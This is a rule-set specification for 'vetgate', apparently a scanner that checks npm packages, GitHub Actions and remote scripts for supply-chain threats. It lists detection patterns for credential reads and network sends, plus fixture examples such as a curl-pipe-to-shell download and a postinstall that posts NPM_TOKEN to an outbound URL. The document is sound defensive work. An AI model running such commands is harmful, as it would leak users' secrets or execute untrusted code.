# vetgate rule set (v1, rules version 2026.10)

Every rule is deterministic: same input bytes plus this rule set always
produce the same verdict, except for the `manifest.checkedAt` timestamp.
Every finding carries the exact matched snippet as evidence, truncated to
120 characters. A finding without evidence is a bug.

Severity decides the verdict: any `high` finding means DENY; otherwise any
finding means REVIEW; no findings means ALLOW. REVIEW findings never DENY
on their own, and no single weak signal DENYs anything.

## How evidence is quoted

- For pattern rules, evidence is a verbatim substring of the scanned text,
  starting shortly before the match, truncated to 120 characters.
- For `install-script-present`, evidence is the script itself
  (`postinstall: <script>`).
- For absence findings (`missing-license`, `action-mutable-tag`), there is
  no matched snippet to quote, so evidence names the location and the
  missing or mutable value instead.
- For an empty action ref there is no snippet at all; evidence is the
  placeholder `(empty ref)`.

## Package content hash

`vetPackageContents` sets `artifact.sha256` to the SHA-256 of the
concatenated file contents, with files ordered by sorted filename, no
separators, and no filenames mixed in. The MCP `vet_package` tool and the
CLI `npm:` spec replace that value with the SHA-256 of the downloaded
tarball bytes, which is the verifiable registry artifact hash; that
replacement is stated in the tool description and the README.

## DENY rules

### install-script-exfil / file-exfil / script-exfil (high)

A credential or environment read AND a network send in the same text.

- Credential patterns: `process.env.<name>` or `process.env[...]`, `$ENV`,
  `/etc/passwd`, `.npmrc`, `.aws/credentials`, an uppercase `*_TOKEN` name,
  `AWS_SECRET_ACCESS_KEY`.
- Network-send patterns: `fetch(`, `curl`, `wget`, `XMLHttpRequest`,
  `http.request(` / `https.request(`, `net.connect(`, `socket.connect(`,
  or any `http://` / `https://` URL.
- Surfaces: `install-script-exfil` for `preinstall` / `install` /
  `postinstall` / `prepare` entries in `package.json`; `file-exfil` for
  scanned `.js` / `.sh` file contents passed in `files`; `script-exfil`
  for remote script text.
- Triggering fixture: postinstall reading `process.env.NPM_TOKEN` and
  posting it with `fetch` to an outbound URL.
- Non-triggering fixture: a file that reads `process.env.HOME` but sends
  nothing, or a file that fetches a public URL without reading any
  credential. Either half alone is not exfiltration.

### download-execute (high)

A download piped straight into an executor in the same text.

- Patterns: `curl ... | sh`, `curl ... | bash`, `curl ... | node`,
  `wget ... | sh`, `wget ... | bash`, and PowerShell `IEX` combined with
  an `http://` / `https://` URL.
- Triggering fixture: `curl https://x.example/install.sh | sh`.
- Non-triggering fixture: `curl` to download a file without piping it to
  an executor, or `echo` piped to `grep`.

### obfuscated-network (high)

An obfuscation marker COMBINED with a network call in the same text.
Obfuscation alone is not DENY; a network call alone is not DENY on this
rule.

- Markers: `eval(atob(`, `Buffer.from(..., "base64")` followed later by
  `eval(`, `String.fromCharCode(` with 10 or more arguments, or a run of
  8 or more `\xNN` hex escapes.
- Network: any network-send pattern or outbound URL, as above.
- Triggering fixtures: `eval(atob(...))` plus `fetch(...)`, and the
  `String.fromCharCode` and dense-hex variants with a fetch.
- Non-triggering fixture: `eval('2 + 2')` with no network call.

### typosquat (high)

Package name at Levenshtein distance exactly 1 from an entry in
`POPULAR_PACKAGES` (see README for the exact list), and not itself an
entry in that list. Distance 0 (the popular name itself) is never a
finding. Scoped names (starting with `@`) are not checked against bare
names.

- Triggering fixture: `reactt` (distance 1 from `react`).
- Non-triggering fixture: `react` itself.
- The list is a fixed sample, not exhaustive: a name absent from the list
  is simply not checked, never declared safe because of that absence.

### action-unpinned (high)

A GitHub Action ref that is `:latest`, `latest`, untagged (no `@`),
empty, malformed (empty owner or repo, whitespace), or otherwise not a
tag or SHA. Triggering fixtures: `actions/checkout@:latest`,
`actions/checkout`, `actions/checkout@`, `checkout@v4` (missing the owner/repo slash form),
and a ref containing a space. A full 40-hex commit SHA is ALLOW, not this rule.

### hidden-unicode-network (high)

A zero-width or bidirectional-override character in the script text
COMBINED with a network send or outbound URL in the same text.

- Characters: U+200B, U+200C, U+200D, U+2066-U+2069, U+FEFF,
  U+202A-U+202E.
- Triggering fixture: a zero-width space plus a `fetch(` call.
- The same hidden character without any network signal is
  `hidden-unicode` (REVIEW), not this rule.

## REVIEW rules (never DENY on their own)

### install-script-present (medium)

Any `preinstall` / `install` / `postinstall` / `prepare` script exists
in `package.json`, whatever it does. The agent should know a script will
run. Triggering fixture: postinstall `echo done` (REVIEW, not DENY).
Safe action: install with `--ignore-scripts`, then run the build step
manually if the code is trusted after reading it.

### missing-license (low)

`package.json` has no usable `license` field. REVIEW only.

### action-mutable-tag (medium)

An action ref that is a tag rather than a full commit SHA: `v4`, `main`,
a semver tag. Safe action: pin the action to a full commit SHA (digest)
instead of the mutable tag.

### hidden-unicode (medium)

A zero-width or bidirectional-override character (same set as above)
with no network signal in the same text. REVIEW only.

### outbound-url (medium, remote scripts only)

A remote script contains an outbound URL but matches no DENY pattern.
Safe action: ask the user before running the script; do not execute it
automatically.

## What v1 deliberately does not flag

- A package with no install script, a license, and no pattern match is
  ALLOW even if it is young, has one maintainer, or carries no provenance
  attestation. Those are weak signals, and v1 does not turn weak signals
  into DENY.
- Known vulnerabilities (CVEs) are not checked: v1 is local-only and has
  no advisory database. That gap is stated in the README, not hidden.
- Network enrichment (OSV lookup, registry metadata) is not in v1 at
  all. The only network traffic is downloading the artifact itself for
  `vet_package`, and fetching the script text for `vet_script`, which is
  labeled in the verdict manifest.
